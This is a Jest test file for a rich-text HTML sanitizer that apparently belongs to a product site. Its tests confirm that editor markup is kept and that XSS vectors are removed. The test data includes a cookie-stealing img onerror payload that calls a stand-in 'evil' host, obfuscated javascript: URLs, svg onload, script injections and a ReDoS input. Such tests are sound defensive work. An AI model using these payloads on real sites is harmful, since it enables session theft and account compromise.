import { extractCloudinaryUrlsFromHtml } from "../cloudinary/cloudinary-html.util";
import {
  escapeRichTextSearchTerm,
  htmlToPlainText,
  sanitizeRichTextHtml,
} from "./rich-text-html.util";

const CLOUDINARY_IMAGE =
  "https://res.cloudinary.com/demo/image/upload/c_limit,w_1000/v1/trybuy/products/abc.jpg";

describe("sanitizeRichTextHtml", () => {
  describe("keeps what the RichTextEditor emits", () => {
    it.each([
      [
        "paragraph + marks",
        "<p>Hi <strong>bold</strong> <em>it</em> <u>u</u> <s>s</s></p>",
      ],
      ["headings", "<h1>a</h1><h2>b</h2><h3>c</h3>"],
      [
        "lists",
        '<ul><li><p>a</p></li></ul><ol start="3"><li><p>b</p></li></ol>',
      ],
      ["blockquote", "<blockquote><p>q</p></blockquote>"],
      [
        "code block",
        '<pre><code class="language-ts">const a = 1 &lt; 2;</code></pre>',
      ],
      ["hard break + rule", "<p>a<br>b</p><hr>"],
      ["image", `<img src="${CLOUDINARY_IMAGE}" alt="shoe">`],
      [
        "link",
        '<a href="https://example.test/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">x</a>',
      ],
      ["entities in text", "<p>Tom &amp; Jerry&nbsp;&lt;3 &#39;x&#39;</p>"],
      ["vietnamese text", "<p>Sản phẩm chính hãng, bảo hành 12 tháng.</p>"],
    ])("%s is unchanged", (_label, html) => {
      expect(sanitizeRichTextHtml(html)).toBe(html);
    });

    it("normalises <br/> and <img …/> without losing them", () => {
      expect(sanitizeRichTextHtml("<p>a<br/>b</p>")).toBe("<p>a<br>b</p>");
      expect(sanitizeRichTextHtml(`<img src="${CLOUDINARY_IMAGE}" />`)).toBe(
        `<img src="${CLOUDINARY_IMAGE}">`,
      );
    });

    it("always adds rel to a link", () => {
      expect(sanitizeRichTextHtml('<a href="https://x.test">x</a>')).toBe(
        '<a href="https://x.test" rel="noopener noreferrer nofollow">x</a>',
      );
    });
  });

  describe("removes script vectors", () => {
    it.each([
      [
        "img onerror (the reported payload)",
        "<img src=x onerror=fetch('https://evil/?c='+document.cookie)>",
        "",
      ],
      [
        "onerror on a valid image",
        `<img src="${CLOUDINARY_IMAGE}" onerror="alert(1)">`,
        `<img src="${CLOUDINARY_IMAGE}">`,
      ],
      [
        "svg onload",
        "<svg onload=alert(1)><circle/></svg><p>ok</p>",
        "<p>ok</p>",
      ],
      ["iframe javascript:", '<iframe src="javascript:alert(1)"></iframe>', ""],
      [
        "script tag + body",
        "<p>a</p><script>alert(1)</script><p>b</p>",
        "<p>a</p><p>b</p>",
      ],
      ["uppercase script", "<SCRIPT>alert(1)</SCRIPT >x", "x"],
      ["unterminated script", "<p>a</p><script>alert(1)", "<p>a</p>"],
      ["style tag", "<style>body{display:none}</style>x", "x"],
      [
        "event handler on allowed tag",
        '<p onclick="alert(1)">x</p>',
        "<p>x</p>",
      ],
      [
        "style attribute",
        '<p style="background:url(javascript:alert(1))">x</p>',
        "<p>x</p>",
      ],
      [
        "comment",
        "<p>a<!-- <img src=x onerror=alert(1)> -->b</p>",
        "<p>ab</p>",
      ],
      ["cdata", "<![CDATA[<img src=x onerror=alert(1)>]]>", "]]&gt;"],
      [
        "unknown wrapper keeps text",
        '<div class="x"><span>t</span></div>',
        "t",
      ],
      ["object/embed", '<object data="x.swf"></object><embed src="x.swf">', ""],
      [
        "form controls",
        '<form action="https://evil"><input value="x"></form>',
        "",
      ],
    ])("%s", (_label, html, expected) => {
      expect(sanitizeRichTextHtml(html)).toBe(expected);
    });

    it.each([
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      " javascript:alert(1)",
      "\u0001javascript:alert(1)",
      "&#1;javascript:alert(1)",
      "java\u0000script:alert(1)",
      "java\tscript:alert(1)",
      "java&#x09;script:alert(1)",
      "&#106;avascript:alert(1)",
      "javascript&colon;alert(1)",
      "vbscript:msgbox(1)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "\\\\evil.test",
    ])("drops href %j", (href) => {
      const cleaned = sanitizeRichTextHtml(`<a href="${href}">x</a>`);
      expect(cleaned).toBe('<a rel="noopener noreferrer nofollow">x</a>');
    });

    it.each([
      "javascript:alert(1)",
      "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
      "/relative.png",
      "x",
    ])("drops an image whose src is %j", (src) => {
      expect(sanitizeRichTextHtml(`<p><img src="${src}"></p>`)).toBe("<p></p>");
    });

    it("cannot be broken out of with a quote in an attribute value", () => {
      const cleaned = sanitizeRichTextHtml(
        `<img src="${CLOUDINARY_IMAGE}" alt='"><script>alert(1)</script>'>`,
      );
      expect(cleaned).toBe(
        `<img src="${CLOUDINARY_IMAGE}" alt="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">`,
      );
    });

    it("escapes a stray < and > in prose instead of treating it as markup", () => {
      expect(sanitizeRichTextHtml("a < b > c <3 <")).toBe(
        "a &lt; b &gt; c &lt;3 &lt;",
      );
    });

    it("re-escapes a bare ampersand but keeps a real entity", () => {
      expect(sanitizeRichTextHtml("<p>R&D &amp; co</p>")).toBe(
        "<p>R&amp;D &amp; co</p>",
      );
    });

    it.each([
      "R&D & co > 10",
      "Tom &amp; Jerry &#60;script&#62;",
      "Hàng chính hãng 100%",
    ])("stores plain text without a `<` as sent: %j", (text) => {
      expect(sanitizeRichTextHtml(text)).toBe(text);
    });

    it("still strips NUL from plain text", () => {
      expect(sanitizeRichTextHtml("a\u0000b")).toBe("ab");
    });
  });

  describe("structure", () => {
    it("closes tags left open and drops a close tag that was never opened", () => {
      expect(sanitizeRichTextHtml("<p><strong>a")).toBe(
        "<p><strong>a</strong></p>",
      );
      expect(sanitizeRichTextHtml("a</p></li>")).toBe("a");
    });

    it("closes inner tags when an outer one closes first", () => {
      expect(sanitizeRichTextHtml("<p><em>a</p>b")).toBe("<p><em>a</em></p>b");
    });

    it("keeps only digits for ol start and img dimensions", () => {
      expect(sanitizeRichTextHtml('<ol start="2x"><li>a</li></ol>')).toBe(
        "<ol><li>a</li></ol>",
      );
      expect(
        sanitizeRichTextHtml(
          `<img src="${CLOUDINARY_IMAGE}" width="40" height="1e9">`,
        ),
      ).toBe(`<img src="${CLOUDINARY_IMAGE}" width="40">`);
    });

    it("keeps only a language-* class on code", () => {
      expect(sanitizeRichTextHtml('<code class="x" >a</code>')).toBe(
        "<code>a</code>",
      );
    });
  });

  it("keeps embedded images discoverable for media cleanup (UP-03)", () => {
    const cleaned = sanitizeRichTextHtml(
      `<p>a</p><img src="${CLOUDINARY_IMAGE}" onerror="x()"><script>y()</script>`,
    );
    expect(extractCloudinaryUrlsFromHtml(cleaned)).toEqual([CLOUDINARY_IMAGE]);
  });

  describe("escapeRichTextSearchTerm", () => {
    it("leaves a keyword without & < > unchanged", () => {
      expect(escapeRichTextSearchTerm('tai nghe "pro" 100%')).toBe(
        'tai nghe "pro" 100%',
      );
    });

    it.each(["R&D", "size < 10 & > 2", "a&&b"])(
      "matches how %j is stored inside sanitized HTML",
      (keyword) => {
        const stored = sanitizeRichTextHtml(`<p>x ${keyword} y</p>`);
        expect(stored).toContain(escapeRichTextSearchTerm(keyword));
      },
    );
  });

  it("is idempotent", () => {
    const inputs = [
      '<p>R&D &amp; <a href="https://x.test/?a=1&b=2">x</a></p>',
      "<img src=x onerror=alert(1)><p>a<br/>b",
      `<p title="&quot;">a &nbsp; b</p><img src="${CLOUDINARY_IMAGE}" alt="&lt;&amp;&gt;">`,
      "a < b <<p>>",
    ];
    for (const html of inputs) {
      const once = sanitizeRichTextHtml(html);
      expect(sanitizeRichTextHtml(once)).toBe(once);
    }
  });

  it("stays fast on a long run of unterminated tags", () => {
    const hostile = '<a "'.repeat(20_000);
    const startedAt = Date.now();
    const cleaned = sanitizeRichTextHtml(hostile);
    expect(Date.now() - startedAt).toBeLessThan(2000);
    expect(cleaned).not.toContain("<a");
  });
});

describe("htmlToPlainText (PRODUCT-QA-01)", () => {
  it("[TC-10] htmlToPlainText turns block tags into newlines, strips tags and decodes basic entities", () => {
    expect(
      htmlToPlainText(
        "<h2>Title</h2><p>Line &amp; <strong>one</strong></p>" +
          "<ul><li><p>a</p></li><li>b&nbsp;c</li></ul>" +
          "<p>x<br>y</p><p>&lt;3 &quot;q&quot; &#39;s&#39;</p>",
      ),
    ).toBe(
      ["Title", "Line & one", "a", "b c", "x", "y", `<3 "q" 's'`].join("\n"),
    );
    expect(htmlToPlainText("plain R&D text")).toBe("plain R&D text");
    expect(htmlToPlainText("")).toBe("");
  });
});
